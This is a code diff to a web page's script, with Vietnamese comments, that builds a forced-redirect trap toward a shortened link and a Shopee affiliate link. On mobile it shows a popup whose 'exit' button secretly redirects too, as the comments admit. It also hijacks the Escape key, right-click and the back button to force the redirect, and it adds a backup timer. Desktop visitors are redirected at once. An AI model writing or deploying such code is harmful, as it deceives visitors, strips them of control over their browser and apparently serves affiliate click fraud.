@@ -226,72 +226,98 @@
         const mobileRedirect = "https://bit.ly/4mFmhBP";
         const desktopRedirect = "https://s.shopee.vn/BHgbsTkUj";
         
-        let redirectUrl = isMobile ? mobileRedirect : desktopRedirect;
         let hasRedirected = false;
         
         // Function để thực hiện chuyển hướng
         function performRedirect() {
             if (!hasRedirected) {
                 hasRedirected = true;
-                window.location.href = redirectUrl;
+                window.location.href = mobileRedirect;
             }
         }
         
-        // Hiện popup sau 0.5 giây
-        setTimeout(() => {
-            document.getElementById('mainPopup').style.display = 'flex';
-        }, 500);
-        
-        // Event listeners cho popup - CẢ 2 NÚT ĐỀU CHUYỂN HƯỚNG
-        document.getElementById('exitBtn').addEventListener('click', function() {
-            // Giả vờ "thoát" nhưng vẫn chuyển hướng
-            performRedirect();
-        });
-        
-        document.getElementById('continueBtn').addEventListener('click', function() {
-            // "Xem ngay" cũng chuyển hướng
-            performRedirect();
-        });
-        
-        // Click vào overlay cũng chuyển hướng
-        document.getElementById('mainPopup').addEventListener('click', function(e) {
-            if (e.target === this) {
+        // Phân biệt mobile và desktop
+        if (isMobile) {
+            // === MOBILE: Hiện popup và các bẫy ===
+            
+            // Hiện popup sau 0.5 giây
+            setTimeout(() => {
+                document.getElementById('mainPopup').style.display = 'flex';
+            }, 500);
+            
+            // Event listeners cho popup - CẢ 2 NÚT ĐỀU CHUYỂN HƯỚNG
+            document.getElementById('exitBtn').addEventListener('click', function() {
                 performRedirect();
-            }
-        });
-        
-        // Event listeners cho các elements chính (nếu popup chưa hiện)
-        document.getElementById("fullClick").addEventListener("click", performRedirect);
-        document.getElementById("realBtn").addEventListener("click", performRedirect);
-        document.getElementById("mobileCard").addEventListener("click", performRedirect);
-        
-        // Ngăn chặn ESC
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
+            });
+            
+            document.getElementById('continueBtn').addEventListener('click', function() {
+                performRedirect();
+            });
+            
+            // Click vào overlay cũng chuyển hướng
+            document.getElementById('mainPopup').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    performRedirect();
+                }
+            });
+            
+            // Event listeners cho các elements chính
+            document.getElementById("fullClick").addEventListener("click", performRedirect);
+            document.getElementById("realBtn").addEventListener("click", performRedirect);
+            document.getElementById("mobileCard").addEventListener("click", performRedirect);
+            
+            // Ngăn chặn ESC
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    e.preventDefault();
+                    performRedirect();
+                }
+            });
+            
+            // Ngăn chặn right-click
+            document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 performRedirect();
-            }
-        });
-        
-        // Ngăn chặn right-click
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            performRedirect();
-        });
-        
-        // Ngăn chặn back button
-        history.pushState(null, null, location.href);
-        window.addEventListener('popstate', function () {
+            });
+            
+            // Ngăn chặn back button
             history.pushState(null, null, location.href);
-            performRedirect();
-        });
-        
-        // Backup redirect sau 15 giây
-        setTimeout(() => {
-            if (!hasRedirected) {
+            window.addEventListener('popstate', function () {
+                history.pushState(null, null, location.href);
                 performRedirect();
-            }
-        }, 15000);
+            });
+            
+            // Backup redirect sau 20 giây cho mobile
+            setTimeout(() => {
+                if (!hasRedirected) {
+                    performRedirect();
+                }
+            }, 20000);
+            
+        } else {
+            // === DESKTOP: Chuyển hướng trực tiếp ===
+            
+            // Ẩn popup cho desktop
+            document.getElementById('mainPopup').style.display = 'none';
+            
+            // Chuyển hướng ngay lập tức đến desktop link
+            setTimeout(() => {
+                if (!hasRedirected) {
+                    hasRedirected = true;
+                    window.location.href = desktopRedirect;
+                }
+            }, 100);
+            
+            // Backup cho desktop
+            window.addEventListener('load', function() {
+                setTimeout(() => {
+                    if (!hasRedirected) {
+                        hasRedirected = true;
+                        window.location.href = desktopRedirect;
+                    }
+                }, 500);
+            });
+        }
     </script>
 </body>
 </html>
